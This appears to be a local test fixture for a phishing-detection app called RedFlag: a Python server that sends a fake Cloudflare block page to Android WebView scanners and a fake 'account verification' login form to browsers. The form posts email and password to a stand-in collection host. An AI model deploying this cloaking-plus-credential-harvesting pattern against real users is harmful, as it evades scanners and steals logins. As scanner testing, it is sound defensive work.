"""LOCAL TEST FIXTURE (never deployed): imitates a site that keeps scanners out (③ test).
RedFlag's hidden WebView (it sends X-Requested-With or an 'Android WebView' client-hint brand) gets a
Cloudflare-style block page (HTTP 403); Chrome gets a fake login form. Logs the deciding headers.
usage: python eval/device/cloak/cloak_server.py  (port 8082; adb reverse tcp:8082 tcp:8082)
"""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BLOCK = b"""<!doctype html><html><head><title>Attention Required! | Cloudflare</title></head><body>
<h1>Sorry, you have been blocked</h1><p>You are unable to access cloak-test.example</p>
<p>Why have I been blocked? This website is using a security service to protect itself from online attacks.</p>
<p>Cloudflare Ray ID: 8f00000000000000</p></body></html>"""
LOGIN = """<!doctype html><html><head><meta name=viewport content="width=device-width"><title>Secure Sign-in</title></head>
<body style="font-family:sans-serif;padding:20px"><h2>Account verification required</h2>
<p>Your account has been temporarily limited. Sign in within 24 hours to restore access.</p>
<form action="https://collect-login.example/submit" method="post">
<label>Email <input type=email name=email placeholder="Email"></label><br><br>
<label>Password <input type=password name=pw placeholder="Password"></label><br><br>
<button>Verify now</button></form><p>TEST FIXTURE · RedFlag cloaking test (local only)</p></body></html>""".encode()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        xrw = self.headers.get("X-Requested-With", "")
        ch = self.headers.get("Sec-CH-UA", "")
        webview = bool(xrw) or "Android WebView" in ch
        print(f"{self.path} webview={webview} xrw={xrw!r} sec-ch-ua={ch!r}", flush=True)
        body, code = (BLOCK, 403) if webview else (LOGIN, 200)
        self.send_response(code); self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass

ThreadingHTTPServer(("127.0.0.1", 8082), H).serve_forever()  # threaded: an idle preconnect must not block it
